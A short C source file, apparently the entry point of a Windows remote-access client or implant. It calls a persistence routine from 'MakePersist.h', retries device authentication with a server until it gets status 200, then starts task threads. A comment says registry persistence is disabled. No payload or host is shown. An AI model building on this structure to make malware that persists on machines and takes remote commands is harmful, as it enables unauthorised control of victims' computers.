#include "TaskManagement.h"
#include "../Network/ApiOperations.h"
#include "../Network/Connect.h"
#include "MakePersist.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{	
	// Prerequisite and persistence methods -- Registry updates are disabled for future inspections --
	install(FALSE);

	// Keep trying to log in if status code is not 200 ok.
	while (authenticateDevice().dwStatusCode != 200) {
		Sleep(SYNC_TIME);
	};

	// LoggedIn : Start all program functions
	runThreads();
	return 0; 
}
